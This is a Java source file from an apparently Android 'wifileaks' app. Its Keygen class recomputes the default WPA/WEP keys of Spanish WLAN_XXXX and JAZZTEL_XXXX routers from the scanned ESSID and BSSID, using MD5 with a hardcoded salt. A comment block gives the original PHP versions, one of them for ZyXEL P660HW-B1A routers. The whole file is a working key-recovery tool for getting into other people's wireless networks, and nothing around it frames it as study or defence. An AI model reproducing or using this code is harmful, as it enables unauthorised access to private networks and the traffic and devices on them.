package com.rubengm.wifileaks;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

import android.net.wifi.ScanResult;

public class Keygen {
	/*// THIS CODE IS UNDER THE PUBLIC DOMAIN

function right($string, $chars) 
{ 
	return substr($string, strlen($string) - $chars, $chars); 
}

if (isset($_POST['essid']) && isset($_POST['bssid']))
{
	$bssid = preg_replace('/:/', '', strtoupper(trim($_POST['bssid'])));

	if (strlen($bssid) != 12)
	{
		die('Mete bien la MAC, buen hombre.');
	}

	$essid = strtoupper(trim($_POST['essid']));
	$_ssid = substr($bssid, 0, 8).right($essid, 4);

	die(substr(md5('bcgbghgg'.$_ssid.$bssid), 0, 20));
}

	Sacado de: http://kz.ath.cx/wlan/codigo.txt

Para ZyXEL P660HW-B1A:

if (isset($_POST['essid']) && isset($_POST['bssid']))
{
   $bssid = preg_replace('/:/', '', strtolower(trim($_POST['bssid'])));

   if (strlen($bssid) != 12)
   {
      die('Mete bien la MAC, buen hombre.');
   }

   $essid = right(strtolower(trim($_POST['essid'])), 4);
   $_ssid = substr($bssid, 0, 8);

   die(substr(strtoupper(md5($_ssid.$essid)), 0, 20));


   Sacado de: http://kz.ath.cx/wlan2/?mirror=1
	 */

	public static String INCOMPATIBLE = "Incompatible";
	public static String OPEN = "Open";
	private static String calc(String essid, String bssid) {
		if(validEssid(essid)) {
			bssid = cleanBssid(bssid);
			essid = essid.toUpperCase();
			String _ssid = mixSsids(essid, bssid);
			String md5 = md5(_ssid);
			String clave = md5.substring(0, 20);
			if (_ssid.length() == 32) {return clave;} else {return clave.toUpperCase();}
		} else {
			return INCOMPATIBLE;
		}
	}

	private static boolean validEssid(String essid) {
		if(essid.toUpperCase().contains("WLAN_") || essid.toUpperCase().contains("JAZZTEL_")) {
			essid = essid.replace("WLAN_", "").replace("JAZZTEL_", "");
			return essid.length() == 4;
		} else return false;
	}

	public static String calc(ScanResult sr) {
		if(sr.capabilities.contains("WPA") || sr.capabilities.contains("WEP") || sr.capabilities.contains("IBSS"))
			return calc(sr.SSID, sr.BSSID);
		else return OPEN;
	}

	private static String right(String string, int chars) {
		return string.substring(string.length() - chars);
	}

	private static String cleanBssid(String bssid) {
		return bssid.replace(":", "").trim().toUpperCase();
	}

	private static String mixSsids(String essid, String bssid) {
		if (bssid.contains("001FA4")) {
			return mixSsids1(essid, bssid);
		} else {
			return mixSsids2(essid, bssid);
		}
	}

	private static String mixSsids1(String essid, String bssid) {
		essid = essid.toLowerCase();
		bssid = bssid.toLowerCase();
		return bssid.substring(0, 8) + right(essid, 4);
	}

	private static String mixSsids2(String essid, String bssid) {
		return "bcgbghgg" + bssid.substring(0, 8) + right(essid, 4) + bssid;
	}

	private static String md5(String s) {
		StringBuffer hexString = new StringBuffer();
		try {
			MessageDigest digest = MessageDigest.getInstance("MD5"); 
			digest.update(s.getBytes());

			byte messageDigest[] = digest.digest();
			int u=0;

			for (int i=0; i<messageDigest.length; i++){	
				u = messageDigest[i] & 255;
				if (u < 16) {
					hexString.append("0" + Integer.toHexString(u));
				} else {
					hexString.append(Integer.toHexString(u));
				}
			}
		} catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
		}
		return hexString.toString();
	}
}